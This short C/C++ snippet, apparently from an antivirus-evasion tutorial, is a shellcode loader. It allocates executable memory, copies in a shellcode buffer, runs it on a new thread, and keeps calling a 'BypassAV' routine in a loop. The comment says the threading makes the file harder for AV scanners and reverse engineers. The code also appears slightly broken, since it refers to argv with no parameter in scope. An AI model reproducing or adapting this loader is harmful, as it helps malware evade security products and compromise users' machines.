// It is always harder to reverse engineer multi threaded PE files, it is also challenging for AV products, multi threading approach can be used with all execution methods above so instead of just pointing a function pointer to shellcode and executing it creating a new thread will complicate things for AV scanners plus it allow us to keep executing the “AV Detect” function while executing the shellcode at same time.
void ExecuteShellcode(){
  char* BUFFER = (char*)VirtualAlloc(NULL, sizeof(Shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
  memcpy(BUFFER, Shellcode, sizeof(Shellcode));
  CreateThread(NULL,0,LPTHREAD_START_ROUTINE(BUFFER),NULL,0,NULL);
  while(TRUE){
    BypassAV(argv);
  }  
}